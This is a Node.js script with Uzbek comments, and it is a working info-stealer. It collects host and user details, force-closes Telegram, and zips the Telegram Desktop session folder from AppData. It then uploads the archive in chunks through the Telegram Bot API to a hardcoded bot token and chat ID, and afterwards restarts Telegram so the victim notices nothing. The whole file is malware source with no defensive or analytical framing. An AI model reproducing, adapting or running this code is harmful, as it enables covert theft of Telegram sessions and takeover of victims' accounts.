const fs = require("fs");
const path = require("path");
const os = require("os");
const archiver = require("archiver");
const FormData = require("form-data");
const https = require("https");

// ===== SOZLAMALAR =====
const BOT_TOKEN = "7719159763:AAEUCdON9VomeMz4985axgbRYySVYlOdumQ";
const CHAT_ID = "2051091708";
const FOLDER_PATH = "C:\\Users\\User\\AppData\\Roaming\\Telegram Desktop";
const CHUNK_SIZE = 49 * 1024 * 1024;
// =======================

// Barcha kutilmagan xatolarni ushlash
process.on("uncaughtException", (err) => {
  sendMessage(`❌ Kutilmagan xato:\n${err.message}\n\nStack: ${err.stack}`, () => process.exit(1));
});

process.on("unhandledRejection", (reason) => {
  sendMessage(`❌ Unhandled rejection:\n${reason}`, () => process.exit(1));
});

// Kompyuter haqida ma'lumot
const pcInfo = [
  `Kompyuter: ${os.hostname()}`,
  `Foydalanuvchi: ${os.userInfo().username}`,
  `OS: ${os.type()} ${os.release()} (${os.platform()})`,
  `Arxitektura: ${os.arch()}`,
  `RAM: ${(os.totalmem() / (1024 * 1024 * 1024)).toFixed(1)} GB`,
  `CPU: ${os.cpus()[0]?.model || "noma'lum"}`,
].join("\n");

const folderPath = FOLDER_PATH;

if (!fs.existsSync(folderPath) || !fs.statSync(folderPath).isDirectory()) {
  sendMessage(`❌ Papka topilmadi: ${folderPath}`, () => process.exit(1));
} else {
  start();
}

function start() {
  const folderName = path.basename(path.resolve(folderPath));
  const zipPath = path.join(os.tmpdir(), `${folderName}.zip`);

  // Papka hajmini hisoblash
  let folderSize = 0;
  try {
    folderSize = getFolderSize(folderPath);
  } catch (e) {
    sendMessage(`❌ Papka hajmini hisoblashda xato:\n${e.message}`, () => process.exit(1));
    return;
  }

  const folderSizeMB = (folderSize / (1024 * 1024)).toFixed(1);
  const isSmall = folderSize <= CHUNK_SIZE;
  const zipLevel = isSmall ? 9 : 1;

  sendMessage(`🟢 Yangi foydalanuvchi run qildi!\n\n${pcInfo}\n\nPapka: ${folderName}\nHajmi: ${folderSizeMB} MB`, () => {
    // Telegramni o'chirish
    const { execSync } = require("child_process");
    try {
      execSync("taskkill /F /IM Telegram.exe", { stdio: "ignore" });
    } catch (e) {}

    setTimeout(() => {
      sendMessage(`📦 Zip qilinyapti: ${folderName} (${folderSizeMB} MB, level: ${zipLevel})...`, () => {
        startZipping(folderName, zipPath, zipLevel);
      });
    }, 2000);
  });
}

function getFolderSize(dir) {
  let size = 0;
  const items = fs.readdirSync(dir, { withFileTypes: true });
  for (const item of items) {
    const fullPath = path.join(dir, item.name);
    try {
      if (item.isDirectory()) {
        size += getFolderSize(fullPath);
      } else {
        size += fs.statSync(fullPath).size;
      }
    } catch (e) {}
  }
  return size;
}

function startZipping(folderName, zipPath, zipLevel) {
  const output = fs.createWriteStream(zipPath);
  const archive = archiver("zip", { zlib: { level: zipLevel } });

  output.on("close", () => {
    let totalSize;
    try {
      totalSize = fs.statSync(zipPath).size;
    } catch (e) {
      sendMessage(`❌ Zip fayl o'qishda xato:\n${e.message}`, () => process.exit(1));
      return;
    }
    const sizeMB = (totalSize / (1024 * 1024)).toFixed(1);

    sendMessage(`📦 Zip tayyor: ${sizeMB} MB`, () => {
      if (totalSize <= CHUNK_SIZE) {
        sendMessage(`📤 Yuborilmoqda: ${folderName}.zip (${sizeMB} MB)`, () => {
          sendFile(zipPath, `${folderName}.zip`, () => {
            try { fs.unlinkSync(zipPath); } catch (e) {}
            restartTelegram();
            sendMessage(`✅ Tayyor! ${folderName}.zip yuborildi.`, () => {});
          });
        });
      } else {
        sendMessage(`📤 Fayl katta (${sizeMB} MB), bo'laklarga bo'linmoqda...`, () => {
          try {
            splitAndSend(folderName, zipPath, totalSize);
          } catch (e) {
            sendMessage(`❌ Bo'laklashda xato:\n${e.message}`, () => process.exit(1));
          }
        });
      }
    });
  });

  archive.on("error", (err) => {
    sendMessage(`❌ Zip qilishda xato:\n${err.message}`, () => process.exit(1));
  });

  archive.on("warning", (warn) => {
    sendMessage(`⚠️ Zip ogohlantirish:\n${warn.message}`, () => {});
  });

  archive.pipe(output);
  archive.directory(folderPath, false);
  archive.finalize();
}

function splitAndSend(folderName, filePath, totalSize) {
  const totalParts = Math.ceil(totalSize / CHUNK_SIZE);
  const partPaths = [];

  const fd = fs.openSync(filePath, "r");
  for (let i = 0; i < totalParts; i++) {
    const partPath = path.join(os.tmpdir(), `${folderName}.zip.part${i + 1}`);
    const buffer = Buffer.alloc(Math.min(CHUNK_SIZE, totalSize - i * CHUNK_SIZE));
    fs.readSync(fd, buffer, 0, buffer.length, i * CHUNK_SIZE);
    fs.writeFileSync(partPath, buffer);
    partPaths.push(partPath);
  }
  fs.closeSync(fd);
  try { fs.unlinkSync(filePath); } catch (e) {}

  sendMessage(`📦 ${totalParts} ta bo'lakka bo'lindi. Yuborish boshlanmoqda...`, () => {
    let index = 0;
    function sendNext() {
      if (index >= partPaths.length) {
        restartTelegram();
        sendMessage(`✅ Tayyor! ${totalParts} ta bo'lak yuborildi.`, () => {});
        return;
      }
      const partFile = partPaths[index];
      const partName = `${folderName}.zip.part${index + 1}of${totalParts}`;
      sendMessage(`📤 ${index + 1}/${totalParts} bo'lak yuborilmoqda...`, () => {
        sendFile(partFile, partName, () => {
          try { fs.unlinkSync(partFile); } catch (e) {}
          index++;
          sendNext();
        });
      });
    }
    sendNext();
  });
}

function restartTelegram() {
  const { spawn } = require("child_process");
  const possiblePaths = [
    `${process.env.APPDATA}\\Telegram Desktop\\Telegram.exe`,
    `${process.env.LOCALAPPDATA}\\Telegram Desktop\\Telegram.exe`,
    "C:\\Program Files\\Telegram Desktop\\Telegram.exe",
    "C:\\Program Files (x86)\\Telegram Desktop\\Telegram.exe",
  ];
  for (const p of possiblePaths) {
    try {
      if (fs.existsSync(p)) {
        spawn(p, [], { detached: true, stdio: "ignore" }).unref();
        return;
      }
    } catch (e) {}
  }
}

function sendMessage(text, onDone) {
  const postData = JSON.stringify({ chat_id: CHAT_ID, text: text });

  const options = {
    hostname: "api.telegram.org",
    path: `/bot${BOT_TOKEN}/sendMessage`,
    method: "POST",
    headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(postData) },
  };

  const req = https.request(options, (res) => {
    let data = "";
    res.on("data", (chunk) => (data += chunk));
    res.on("end", () => { if (onDone) onDone(); });
  });
  req.on("error", () => { if (onDone) onDone(); });
  req.write(postData);
  req.end();
}

function sendFile(filePath, fileName, onDone) {
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("caption", fileName);
  form.append("document", fs.createReadStream(filePath), { filename: fileName });

  const options = {
    hostname: "api.telegram.org",
    path: `/bot${BOT_TOKEN}/sendDocument`,
    method: "POST",
    headers: form.getHeaders(),
  };

  const req = https.request(options, (res) => {
    let data = "";
    res.on("data", (chunk) => (data += chunk));
    res.on("end", () => {
      try {
        const result = JSON.parse(data);
        if (!result.ok) {
          sendMessage(`❌ Fayl yuborishda xato (${fileName}):\n${result.description}`, () => { if (onDone) onDone(); });
          return;
        }
      } catch (e) {}
      if (onDone) onDone();
    });
  });
  req.on("error", (err) => {
    sendMessage(`❌ Tarmoq xato (${fileName}):\n${err.message}`, () => { if (onDone) onDone(); });
  });
  form.pipe(req);
}
